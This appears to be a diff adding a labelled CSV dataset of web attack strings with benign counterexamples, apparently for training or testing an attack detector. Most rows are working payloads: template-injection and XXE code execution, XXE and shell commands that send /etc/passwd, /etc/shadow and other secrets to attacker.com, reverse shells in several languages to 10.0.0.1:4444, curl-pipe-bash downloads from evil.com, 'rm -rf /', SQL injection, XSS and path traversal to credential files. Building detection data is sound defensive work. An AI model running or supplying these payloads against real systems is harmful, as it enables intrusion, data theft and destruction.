+"${T(javax.script.ScriptEngineManager).newInstance().getEngineByName('JavaScript').eval('java.lang.Runtime.getRuntime().exec(\calc\"")')}""",SSTI
+{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}},SSTI
+<%= system('id') %>,SSTI
+#{T(java.lang.Runtime).getRuntime().exec('calc')},SSTI
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())},SSTI
+{{7*'7'}},SSTI
+${7*'7'},SSTI
+<%= 7*'7' %>,SSTI
+"{{request.application.__globals__.__builtins__.__import__('subprocess').check_output('id',shell=True)}}",SSTI
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/shadow').read()}},SSTI
+"{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}",SSTI
+${T(java.lang.Runtime).getRuntime().exec('wget http://evil.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh')},SSTI
+<#assign ex='freemarker.template.utility.Execute'?new()>${ex('wget http://evil.com/backdoor')},SSTI
+{{request.application.__globals__.__builtins__.__import__('os').system('nc -e /bin/sh attacker.com 4444')}},SSTI
+{{config.__class__.__init__.__globals__['os'].popen('curl http://evil.com/malware | bash').read()}},SSTI
+<%= `whoami` %>,SSTI
+#{system('id')},SSTI
+*{T(java.lang.Runtime).getRuntime().exec('cmd /c calc')},SSTI
+{{7**7}},SSTI
+${7**7},SSTI
+{{request.__class__}},SSTI
+{{request.__class__.__mro__}},SSTI
+{{request.__class__.__mro__[1]}},SSTI
+{{''.__class__.__bases__[0].__subclasses__()}},SSTI
+{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}},SSTI
+{{cycler.__init__.__globals__.os.popen('id').read()}},SSTI
+{{joiner.__init__.__globals__.os.popen('id').read()}},SSTI
+{{namespace.__init__.__globals__.os.popen('id').read()}},SSTI
+${T(java.lang.System).getenv()},SSTI
+${T(java.lang.System).getProperty('user.dir')},SSTI
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI
+<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /etc/passwd')},SSTI
+${T(java.lang.Runtime).getRuntime().exec('whoami')},SSTI
+{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}},SSTI
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/shadow').read()}},SSTI
+<%= 7*7 %>,SSTI
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())},SSTI
+{{''.__class__.__mro__[2].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('id')}},SSTI
+"{{request.application.__globals__.__builtins__.eval(\__import__('os').popen('id').read()\"")}}""",SSTI
+{{config.__class__.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}},SSTI
+${@java.lang.System@getProperty('java.version')},SSTI
+<%= File.read('/etc/shadow') %>,SSTI
+#{File.open('/etc/passwd').read},SSTI
+*{new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/etc/passwd')))},SSTI
+"{{''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].modules['subprocess'].check_output('whoami',shell=True)}}",SSTI
+${T(java.lang.Runtime).getRuntime().exec('bash -c whoami')},SSTI
+<#assign ex='freemarker.template.utility.Execute'?new()>${ex('ls -la')},SSTI
+<%= `ls -la` %>,SSTI
+{{''.__class__.__mro__[2].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('whoami').read()}},SSTI
+<xml><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/xxe'>]>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/xxe.dtd'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'php://filter/convert.base64-encode/resource=index.php'>]><data>&file;</data>,XXE
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'><!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%dtd;]>,XXE
+<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://id'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE x [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]><r>&xxe;</r>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'>]>,XXE
+<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///var/www/html/config.php'>]><data>&file;</data>,XXE
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/shadow'><!ENTITY % dtd SYSTEM 'http://attacker.com/xxe.dtd'>%dtd;]>,XXE
+<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://whoami'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///proc/self/environ'>]><test>&xxe;</test>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/version'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=/etc/passwd'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/html/.htaccess'>]><data>&file;</data>,XXE
+<!DOCTYPE foo [<!ENTITY % blind SYSTEM 'http://attacker.com/?data=%file;'><!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'>%blind;]>,XXE
+<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/boot.ini'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/inetpub/wwwroot/web.config'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/panther/unattend.xml'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///c:/program files/apache/conf/httpd.conf'>]><data>&file;</data>,XXE
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///c:/users/administrator/desktop/passwords.txt'><!ENTITY % dtd SYSTEM 'http://attacker.com/win.dtd'>%dtd;%xxe;]>,XXE
+<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file://127.0.0.1/c$/windows/win.ini'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/system32/config/sam'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/sudoers'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/xxe.xml'>%xxe;]>,XXE
+<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://ls'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]><root>&xxe;</root>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///var/log/apache2/access.log'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///home/user/.ssh/id_rsa'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///root/.bash_history'>]><data>&file;</data>,XXE
+<!DOCTYPE foo [<!ENTITY % local SYSTEM 'file:///etc/passwd'><!ENTITY % remote SYSTEM 'http://attacker.com/evil.dtd'>%remote;%local;]>,XXE
+<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://cat /etc/passwd'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///proc/self/cmdline'>]><test>&xxe;</test>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/self/fd/0'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aXXE%250d%250a.%250d%250aQUIT%250d%250a'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'jar:file:///var/www/html/upload.zip!/shell.php'>]><data>&file;</data>,XXE
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///c:/windows/win.ini'><!ENTITY % dtd SYSTEM 'http://attacker.com/xxe.dtd'>%dtd;%xxe;]>,XXE
+<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'netdoc:/etc/passwd'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/issue'>]><root>&xxe;</root>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///var/www/html/index.php'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///usr/local/apache2/conf/httpd.conf'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///opt/tomcat/conf/server.xml'>]><data>&file;</data>,XXE
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///var/log/nginx/error.log'><!ENTITY % dtd SYSTEM 'http://attacker.com/log.dtd'>%dtd;%xxe;]>,XXE
+<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://nc -lvvp 4444'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///proc/net/tcp'>]><test>&xxe;</test>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///sys/class/net/eth0/address'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://input'>]><foo>&xxe;</foo>,XXE
+"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4='>]><data>&file;</data>",XXE
+<!DOCTYPE foo [<!ENTITY % local SYSTEM 'file:///etc/shadow'><!ENTITY % remote SYSTEM 'http://attacker.com/exfil.dtd'>%remote;%local;%send;]>,XXE
+<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://wget http://evil.com/shell.sh -O /tmp/s.sh'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///home/user/.bashrc'>]><root>&xxe;</root>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///opt/app/config/database.yml'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///var/lib/mysql/my.cnf'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/mysql/my.cnf'>]><data>&file;</data>,XXE
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///app/config/secrets.yml'><!ENTITY % dtd SYSTEM 'http://attacker.com/steal.dtd'>%dtd;%xxe;]>,XXE
+<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64)'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///proc/self/status'>]><test>&xxe;</test>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/self/maps'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'ftp://attacker.com:21/xxe.txt'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'dict://attacker.com:11211/stats'>]><data>&file;</data>,XXE
+<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///c:/windows/system.ini'>]><root>&xxe;</root>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/tasks/at.exe'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/system32/config/system'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/boot.ini'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///c:/pagefile.sys'>]><data>&file;</data>,XXE
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///c:/windows/repair/sam'><!ENTITY % dtd SYSTEM 'http://attacker.com/win.dtd'>%dtd;%xxe;]>,XXE
+<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file://127.0.0.1/c$/boot.ini'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///c:/autoexec.bat'>]><test>&xxe;</test>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/config.sys'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/resolv.conf'>]><foo>&xxe;</foo>,XXE
+<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/hosts.allow'>]><data>&file;</data>,XXE
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/hosts.deny'><!ENTITY % dtd SYSTEM 'http://attacker.com/xxe.dtd'>%dtd;%xxe;]>,XXE
+<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/crontab'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/fstab'>]><root>&xxe;</root>,XXE
+<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/group'>]><foo>&xxe;</foo>,XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/gshadow'>]><foo>&xxe;</foo>,XXE
+admin,Benign
+password123,Benign
+/index.php,Benign
+search.php?query=test,Benign
+John Doe,Benign
+About Us,Benign
+contact.html,Benign
+login.php,Benign
+my_username,Benign
+1 AND 1=1,Benign
+category=electronics,Benign
+home,Benign
+products,Benign
+about-us,Benign
+contact-us,Benign
+services,Benign
+blog,Benign
+news,Benign
+faq,Benign
+help,Benign
+support,Benign
+login,Benign
+register,Benign
+signup,Benign
+profile,Benign
+dashboard,Benign
+settings,Benign
+account,Benign
+cart,Benign
+checkout,Benign
+payment,Benign
+search,Benign
+results,Benign
+category,Benign
+product-details,Benign
+user-guide,Benign
+documentation,Benign
+api-docs,Benign
+terms,Benign
+privacy,Benign
+cookies,Benign
+sitemap,Benign
+404,Benign
+error,Benign
+test,Benign
+demo,Benign
+sample,Benign
+example,Benign
+index.html,Benign
+page.php,Benign
+view.asp,Benign
+default.jsp,Benign
+main.py,Benign
+app.js,Benign
+style.css,Benign
+image.jpg,Benign
+file.pdf,Benign
+document.docx,Benign
+data.json,Benign
+config.xml,Benign
+readme.md,Benign
+username123,Benign
+password,Benign
+email@example.com,Benign
+123-456-7890,Benign
+New York,Benign
+Product Name,Benign
+Description here,Benign
+Click here,Benign
+Learn more,Benign
+Buy now,Benign
+Add to cart,Benign
+Submit,Benign
+Cancel,Benign
+Save,Benign
+Delete,Benign
+Edit,Benign
+View,Benign
+Download,Benign
+Upload,Benign
+Share,Benign
+Like,Benign
+Comment,Benign
+Follow,Benign
+Unfollow,Benign
+Subscribe,Benign
+Unsubscribe,Benign
+Hello World,Benign
+Welcome,Benign
+Thank you,Benign
+Goodbye,Benign
+Yes,Benign
+No,Benign
+Maybe,Benign
+OK,Benign
+localhost,Benign
+127.0.0.1,Benign
+192.168.1.1,Benign
+google.com,Benign
+8.8.8.8,Benign
+/products/view?id=1024&category=books,Benign
+/search?q=hello+world&sort=desc,Benign
+/api/v1/user/profile?uid=5912,Benign
+/login?redirect=/dashboard,Benign
+/bbs/board.php?bo_table=free&wr_id=10,Benign
+email=support@shieldhub.com,Benign
+date=2025-11-14,Benign
+"price=1,000,000",Benign
+comment=This+is+great!,Benign
+refer=https://google.com,Benign
+user_agent=Mozilla/5.0,Benign
+path=/usr/local/bin (docs),Benign
+1+1=2,Benign
+admin_page,Benign
+sub_title=Hello&World,Benign
+msg=alert(message),Benign
+desc=10% discount,Benign
+file=report.pdf,Benign
+javascript:void(0),Benign
+javascript:history.back(),Benign
+<img src='logo.png'>,Benign
+<b>Bold Text</b>,Benign
+<i>Italic</i>,Benign
+width=100%,Benign
+height=50px,Benign
+x=10&y=20,Benign
+kor=안녕하세요,Benign
+eng=Hello,Benign
+%00,Benign
+%20,Benign
+' OR '1'='1' --,SQLi
+admin' -- #1,SQLi
+' OR 1=1 --,SQLi
+"1' UNION SELECT NULL,NULL,NULL --",SQLi
+1' AND '1'='1,SQLi
+' OR 'x'='x,SQLi
+1'; DROP TABLE users-- #6,SQLi
+"' UNION SELECT username, password FROM users--",SQLi
+1' AND 1=1 UNION SELECT table_name FROM information_schema.tables--,SQLi
+admin' OR '1'='1' /*,SQLi
+' OR 1=1#,SQLi
+1' ORDER BY 10--,SQLi
+' UNION ALL SELECT NULL--,SQLi
+"1' GROUP BY 1,2,3--",SQLi
+admin' AND '1'='2,SQLi
+1' HAVING 1=1--,SQLi
+' OR 'a'='a,SQLi
+1'; WAITFOR DELAY '00:00:05'--,SQLi
+' OR SLEEP(5)--,SQLi
+"1' AND BENCHMARK(5000000,MD5('A'))-- #19",SQLi
+admin')) OR '1'='1'--,SQLi
+1' UNION SELECT @@version-- #21,SQLi
+' OR user='admin,SQLi
+"1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",SQLi
+admin' OR 1=1 LIMIT 1--,SQLi
+"' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()--",SQLi
+1' AND (SELECT COUNT(*) FROM users) > 0--,SQLi
+' OR EXISTS(SELECT * FROM users)--,SQLi
+1' UNION SELECT LOAD_FILE('/etc/passwd')--,SQLi
+"admin' AND SUBSTRING(password,1,1)='a'--",SQLi
+"' OR '1'='1' UNION SELECT NULL,NULL--",SQLi
+1'; EXEC xp_cmdshell('dir')-- #31,SQLi
+admin' OR LENGTH(password)>5--,SQLi
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,SQLi
+1' AND (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')='users'--,SQLi
+admin')) OR (('1'='1,SQLi
+"' OR 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",SQLi
+"1' UNION SELECT user(),database(),version()--",SQLi
+"' OR SUBSTRING(username,1,1)='a'--",SQLi
+"admin' AND 1=0 UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables--",SQLi
+"1' AND MID(version(),1,1)='5'--",SQLi
+' OR '1'='1' ORDER BY 1--,SQLi
+admin' UNION SELECT password FROM users WHERE username='admin'--,SQLi
+"1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",SQLi
+"' OR updatexml(1,concat(0x7e,version()),0)--",SQLi
+"admin' OR extractvalue(1,concat(0x7e,database()))--",SQLi
+"1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--",SQLi
+' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--,SQLi
+"admin' AND polygoncontains(1,1)--",SQLi
+"1' PROCEDURE ANALYSE(extractvalue(rand(),concat(0x3a,version())),1)--",SQLi
+"<script>alert(String.fromCharCode(88,83,83))</script>",XSS
+<img src=x onerror=alert(document.domain)>,XSS
+<svg onload=alert(document.cookie)>,XSS
+<iframe srcdoc='<script>alert(1)</script>'>,XSS
+<a href='javascript:void(alert(1))'>Click</a>,XSS
+<details ontoggle=alert(1)><summary>Click</summary>,XSS
+<video src=x onerror=alert(1)> #6,XSS
+<audio src=x onerror=alert(1)> #7,XSS
+<marquee onstart=alert(1)>XSS</marquee>,XSS
+<isindex type=image src=1 onerror=alert(1)> #9,XSS
+<form><button formaction=javascript:alert(1)>X,XSS
+<input type=image src=x onerror=alert(1)>,XSS
+<select onfocusin=alert(1)><option>X,XSS
+<textarea onfocusout=alert(1)>,XSS
+<keygen autofocus onfocus=alert(1)>,XSS
+<video poster=javascript:alert(1)>,XSS
+<body onbeforeprint=alert(1)>,XSS
+<body onafterprint=alert(1)>,XSS
+<body onhashchange=alert(1)>,XSS
+<body onmessage=alert(1)>,XSS
+<body onoffline=alert(1)>,XSS
+<body ononline=alert(1)>,XSS
+<body onpopstate=alert(1)>,XSS
+<body onstorage=alert(1)>,XSS
+<body onundo=alert(1)>,XSS
+<body onunload=alert(1)>,XSS
+<frameset onload=alert(1)>,XSS
+<object data=javascript:alert(1)> #27,XSS
+<embed src=javascript:alert(1)> #28,XSS
+<applet code=javascript:alert(1)>,XSS
+<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,XSS
+<link rel=import href=javascript:alert(1)>,XSS
+<base href=javascript:alert(1)//>,XSS
+"<script src=data:,alert(1)>",XSS
+<script src=//brutelogic.com.br/1.js>,XSS
+<img src=x:alert(alt) onerror=eval(src) alt=1>,XSS
+<img src='x' onerror='alert(1)'>,XSS
+<img/src='x'/onerror='alert(1)'>,XSS
+<IMG SRC=j&#X41vascript:alert('test')>,XSS
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,XSS
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,XSS
+<IMG SRC='jav&#x09;ascript:alert(1)'>,XSS
+<IMG SRC='jav&#x0A;ascript:alert(1)'>,XSS
+<IMG SRC='jav&#x0D;ascript:alert(1)'>,XSS
+<<SCRIPT>alert('XSS');//<</SCRIPT>,XSS
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>,XSS
+<IMG DYNSRC='javascript:alert(1)'>,XSS
+<IMG LOWSRC='javascript:alert(1)'>,XSS
+<STYLE>li {list-style-image: url('javascript:alert(1)');}</STYLE><UL><LI>XSS,XSS
+"<IMG SRC='vbscript:msgbox(""XSS"")'>",XSS
+cmd0 ; ls -la,COMMAND_INJECTION
+cmd1 | cat /etc/passwd,COMMAND_INJECTION
+&& whoami,COMMAND_INJECTION
+|| id,COMMAND_INJECTION
+`uname -a`,COMMAND_INJECTION
+cmd5 $(cat /etc/shadow),COMMAND_INJECTION
+; rm -rf /,COMMAND_INJECTION
+| nc attacker.com 4444,COMMAND_INJECTION
+&& curl http://evil.com/shell.sh | bash,COMMAND_INJECTION
+; wget http://malicious.com/backdoor.php,COMMAND_INJECTION
+| echo vulnerable > /tmp/pwned.txt,COMMAND_INJECTION
+"&& python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""]);'",COMMAND_INJECTION
+"; perl -e 'use Socket;$i=""10.0.0.1"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'",COMMAND_INJECTION
+| bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,COMMAND_INJECTION
+"&& php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",COMMAND_INJECTION
+"; ruby -rsocket -e'f=TCPSocket.open(""10.0.0.1"",4444).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",COMMAND_INJECTION
+| nohup nc -e /bin/sh 10.0.0.1 4444 &,COMMAND_INJECTION
+&& telnet 10.0.0.1 4444 | /bin/bash,COMMAND_INJECTION
+; mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | nc 10.0.0.1 4444 > /tmp/s,COMMAND_INJECTION
+| env,COMMAND_INJECTION
+&& ps aux,COMMAND_INJECTION
+; netstat -an,COMMAND_INJECTION
+cmd22 | ifconfig,COMMAND_INJECTION
+&& cat /proc/cpuinfo,COMMAND_INJECTION
+; curl http://metadata.google.internal/computeMetadata/v1/,COMMAND_INJECTION
+| wget -O- http://169.254.169.254/latest/meta-data/,COMMAND_INJECTION
+&& echo $PATH,COMMAND_INJECTION
+; printenv,COMMAND_INJECTION
+| cat ~/.ssh/id_rsa,COMMAND_INJECTION
+"&& find / -name ""*.conf""",COMMAND_INJECTION
+"; grep -r ""password"" /etc/",COMMAND_INJECTION
+| strings /usr/bin/sudo,COMMAND_INJECTION
+&& strace -p 1,COMMAND_INJECTION
+; gdb -p 1234,COMMAND_INJECTION
+| ltrace /bin/ls,COMMAND_INJECTION
+&& dd if=/dev/sda of=/tmp/disk.img,COMMAND_INJECTION
+; mount /dev/sdb1 /mnt,COMMAND_INJECTION
+| crontab -l,COMMAND_INJECTION
+&& systemctl status,COMMAND_INJECTION
+; journalctl -xe,COMMAND_INJECTION
+| dmesg,COMMAND_INJECTION
+&& lsof -i,COMMAND_INJECTION
+; ss -tulpn,COMMAND_INJECTION
+| iptables -L,COMMAND_INJECTION
+&& curl -X POST -F 'file=@/etc/passwd' http://attacker.com,COMMAND_INJECTION
+; base64 /etc/shadow | curl -d @- http://attacker.com,COMMAND_INJECTION
+| tar czf - /var/www | nc attacker.com 4444,COMMAND_INJECTION
+&& zip -r - /home | curl -X PUT --upload-file - http://attacker.com,COMMAND_INJECTION
+; python -m SimpleHTTPServer 8000,COMMAND_INJECTION
+../../../etc/passwd?v=0,PATH_TRAVERSAL
+..\..\..\windows\system32\config\sam,PATH_TRAVERSAL
+....//....//....//etc/passwd?v=2,PATH_TRAVERSAL
+..%2F..%2F..%2Fetc%2Fpasswd?v=3,PATH_TRAVERSAL
+..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam,PATH_TRAVERSAL
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,PATH_TRAVERSAL
+..%252f..%252f..%252fetc%252fpasswd,PATH_TRAVERSAL
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd,PATH_TRAVERSAL
+..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd,PATH_TRAVERSAL
+/var/www/../../etc/passwd?v=9,PATH_TRAVERSAL
+file:///etc/passwd?v=10,PATH_TRAVERSAL
+file:///c:/windows/system32/config/sam,PATH_TRAVERSAL
+../../../../../../etc/shadow,PATH_TRAVERSAL
+../../../var/log/apache2/access.log,PATH_TRAVERSAL
+..\..\..\..\..\boot.ini,PATH_TRAVERSAL
+....//....//....//....//....//etc/hosts,PATH_TRAVERSAL
+%2e%2e/%2e%2e/%2e%2e/etc/passwd,PATH_TRAVERSAL
+..;/..;/..;/etc/passwd?v=17,PATH_TRAVERSAL
+..//..//..//etc/passwd,PATH_TRAVERSAL
+..\\..\\..\\windows\\win.ini,PATH_TRAVERSAL
+.../.../.../.../etc/passwd,PATH_TRAVERSAL
+..%00/..%00/..%00/etc/passwd,PATH_TRAVERSAL
+../../../proc/self/environ,PATH_TRAVERSAL
+../../../var/log/auth.log,PATH_TRAVERSAL
+..\..\..\..\xampp\apache\logs\access.log,PATH_TRAVERSAL
+../../../../etc/group,PATH_TRAVERSAL
+../../../home/user/.bash_history,PATH_TRAVERSAL
+..\..\..\users\administrator\ntuser.dat,PATH_TRAVERSAL
+../../../../var/www/html/config.php,PATH_TRAVERSAL
+../../../etc/ssh/sshd_config,PATH_TRAVERSAL
+..\..\..\windows\system32\drivers\etc\hosts,PATH_TRAVERSAL
+../../../../proc/version,PATH_TRAVERSAL
